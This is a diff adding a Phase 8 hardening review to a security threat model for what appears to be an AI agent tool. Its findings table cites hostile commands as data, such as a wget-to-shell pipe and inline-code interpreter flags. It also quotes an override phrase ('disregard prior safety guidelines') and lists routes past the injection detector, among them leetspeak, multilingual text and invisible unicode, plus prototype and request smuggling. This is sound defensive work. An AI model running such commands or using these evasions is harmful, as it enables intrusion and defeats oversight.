@@ -178,3 +178,35 @@ Project A context/memory leaks into Project B run.
 
 Revisit this model at every phase gate and after any security incident. Changes recorded
 via ADR + version note below. **v1.0 — 2026-09-17 (Phase 0 baseline).**
+
+---
+
+## v2.0 — 2026-09-18 (Phase 8 hardening review)
+
+**Findings landed by this phase's fuzz/red-team sweeps** (each also recorded as a test):
+
+| # | Finding | Fix | Lane proof |
+|---|---|---|---|
+| F1 | `chmod` world-writable without `-r` classified only "medium" | world-writable modes (777/666/a+w) now `high` (approval-gated), recursive world-writable stays `blocked` | `tests/security/fuzz-classifier.test.mjs` recall + `tests/security/command-injection.test.mjs` |
+| F2 | `python3 -c` / `node -e` / `bash -c` inline code evaded per-token classification (defaulted "medium") | inline-code flags now `high` | `tests/security/redteam-injection.test.mjs` case `node -e` |
+| F3 | Piped RCE rule was curl-only; `wget -qO- http://x \| sh` evaded | download tools (curl/wget/fetch) piped to any interpreter (bash/sh/python/node/perl) now `blocked` | `fuzz-classifier` recall |
+| F4 | Override-safety detector missed adjective forms ("disregard **prior safety** guidelines") | verb-object gap tolerance | `redteam-injection` recall floor (7/7) |
+| F5 | `aws_secret_access_key` pattern missed JSON/YAML-quoted key form | quoted-key tolerance; gate lane (`scripts/check-secrets.mjs`) aligned | `redteam-injection` redact lane |
+| F6 | HTTP body-cap race: client layer enforced cap but test fixture revealed the *content-length lie* shape truncates benignly at 12-byte declaration (Node semantics) | abuse suite documents the exact failure surfaces (truncated body never parses into success) | `tests/security/mcp-abuse.test.mjs` |
+| F7 | `__proto__` smuggle through bridge arg validation (found Phase 7 P7.4; canonicalized here) | `Object.hasOwn` + forbidden keys + null-prototype output | `tests/unit/ui/bridge.test.mjs`, `tests/security/fuzz-bridge.test.mjs` |
+
+**Residual risk log (honest accounting)**:
+1. *Multilingual injection detection* — English-tuned regex rules only; compensating
+   controls are display-only lanes + policy gating (T1/T2). Deferred to a model-backed
+   detector or a broader corpus.
+2. *Spacing/leetspeak obfuscation* of directives — same compensating controls; never the
+   sole gate.
+3. *Model-side invisible unicode* payloads (tag chars, bidi) — untested class; queued as a
+   follow-on case (documented boundary).
+4. *MCP request-smuggling* (content-length desync) — transport truncation behavior relies
+   on Node semantics; when the Tauri native bridge lands, its HTTP stack must re-certify
+   these suites (they are transport-surface tests).
+
+**Enforcement upgrade**: `npm run security:gate` is the canonical blocking lane set
+(secrets/audit/supply-chain/SAST); `scripts/ci/ci.yml` should invoke it where available
+(workflow already planted; install pending Phase 9).
